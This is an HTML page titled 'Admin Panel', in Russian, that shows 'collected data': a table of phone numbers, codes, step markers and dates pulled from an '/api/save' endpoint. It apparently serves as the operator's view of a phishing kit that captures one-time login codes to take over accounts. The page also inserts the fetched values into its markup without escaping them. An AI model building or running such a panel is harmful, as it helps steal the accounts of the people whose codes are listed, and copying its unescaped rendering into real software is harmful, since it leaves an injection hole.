<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>

<style>
body {
  font-family: Arial;
  background:#f4f4f4;
  padding:30px;
}
table {
  width:100%;
  border-collapse:collapse;
  background:#fff;
}
th, td {
  padding:10px;
  border:1px solid #ddd;
  text-align:left;
}
th {
  background:#203a43;
  color:white;
}
button {
  padding:10px 20px;
  margin-bottom:20px;
  cursor:pointer;
}
</style>
</head>
<body>

<h2>Собранные данные</h2>
<button onclick="loadData()">Обновить</button>

<table>
  <thead>
    <tr>
      <th>Телефон</th>
      <th>Код</th>
      <th>Шаг</th>
      <th>Дата</th>
    </tr>
  </thead>
  <tbody id="tableBody"></tbody>
</table>

<script>
async function loadData(){
  const res = await fetch("/api/save");
  const data = await res.json();

  const tableBody = document.getElementById("tableBody");
  tableBody.innerHTML = "";

  data.forEach(item => {
    const row = `
      <tr>
        <td>${item.phone || ""}</td>
        <td>${item.code || ""}</td>
        <td>${item.step || ""}</td>
        <td>${item.date || ""}</td>
      </tr>
    `;
    tableBody.innerHTML += row;
  });
}

loadData();
</script>

</body>
</html>
